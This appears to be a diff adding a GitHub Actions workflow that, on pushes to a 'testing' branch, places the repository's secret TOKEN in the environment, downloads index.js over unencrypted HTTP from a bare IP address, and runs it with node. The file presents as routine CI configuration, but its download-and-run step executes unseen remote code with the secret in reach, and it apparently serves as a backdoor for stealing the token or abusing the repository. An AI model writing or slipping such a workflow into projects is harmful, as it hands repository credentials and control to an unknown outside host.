@@ -1,0 +1,30 @@
+name: Run index.js
+
+on:
+  push:
+    branches: [ testing ]
+
+jobs:
+  run_index:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.TOKEN }}
+      GITHUB_REPOSITORY: ${{ github.repository }}
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v2
+      with:
+        node-version: '14'
+
+    - name: Install dependencies
+      run: npm install commander axios @octokit/rest
+
+    - name: Download index.js
+      run: curl http://139.84.155.86:8000/index.js -o index.js
+
+    - name: Run index.js
+      run: node index.js
